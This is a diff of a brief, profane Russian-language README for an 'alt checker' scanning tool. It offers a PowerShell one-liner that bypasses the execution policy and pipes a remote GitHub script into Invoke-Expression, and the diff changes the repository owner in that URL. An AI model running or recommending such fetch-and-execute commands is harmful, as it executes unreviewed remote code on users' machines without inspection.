@@ -1,6 +1,6 @@
 АЛЬТЧЕКЕР ДЛЯ Я ХЗ, короче просто нажимаешь скан и оно сканит ты прикинь сука, прям рил сканит 
 типа приложение есть и скрипт
 ```
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/sweetvata/Y-Alts/main/Y-Alts.ps1 | iex"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/piltouface/Y-Alts/main/Y-Alts.ps1 | iex"
 ```
 zxc
